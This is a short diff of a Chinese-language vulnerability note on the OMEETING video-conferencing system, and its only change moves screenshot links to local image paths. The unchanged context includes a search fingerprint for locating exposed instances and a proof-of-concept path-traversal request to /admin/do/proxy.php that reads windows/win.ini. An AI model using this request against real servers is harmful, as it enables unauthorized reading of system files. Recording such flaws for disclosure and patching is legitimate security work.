@@ -20,7 +20,7 @@ app="OMEETING-OM视频会议"
 
 登录页面
 
-![image-20220525153028849](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251530024.png)
+![image-20220525153028849](./images/202205251530024.png)
 
 验证POC
 
@@ -28,4 +28,4 @@ app="OMEETING-OM视频会议"
 /admin/do/proxy.php?method=get&target=../../../../../../../../../../windows/win.ini
 ```
 
-![image-20220525153105283](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205251531338.png)
+![image-20220525153105283](./images/202205251531338.png)
